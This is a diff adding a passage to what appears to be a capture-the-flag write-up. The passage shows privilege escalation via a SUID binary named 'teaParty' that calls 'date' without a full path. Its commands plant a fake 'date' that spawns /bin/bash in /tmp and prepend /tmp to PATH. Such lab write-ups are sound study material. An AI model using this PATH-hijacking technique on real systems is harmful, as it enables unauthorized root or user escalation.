@@ -118,5 +118,36 @@ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 have a shell with as rabbit user but this is also low permision
 continue
 
+we find a file have SUID permision at path "/home/rabbit" with name "teaParty"
+try to read it by "cat" but nothing useful can understanding, try with methods such as "strings" but is not install.
+so i search and find this command to read this file
+
+```bash
+awk 'BEGIN {FS="[^[:print:]]+"} {for(i=1;i<=NF;i++) if(length($i)>=4) print $i}' teaParty
+```
+
+![img](Screenshots/fvf)
+
+this is important line 
+" /bin/echo -n 'Probably by ' && date --date='next hour' -R "
+file date is called without special path
+
+go to /tmp and create file, and write inside it "/bin/bash"
+and change enviroment variable "$PATH" to search first at /tmp
+
+```bash
+cd /tmp
+echo "/bin/bash" > date
+chmod +x date
+export PATH=/tmp:$PATH
+```
+now return to file teaParty and run it
+
+```bash
+cd /home/rabbit
+./teaParty
+```
+
+
 
 ---
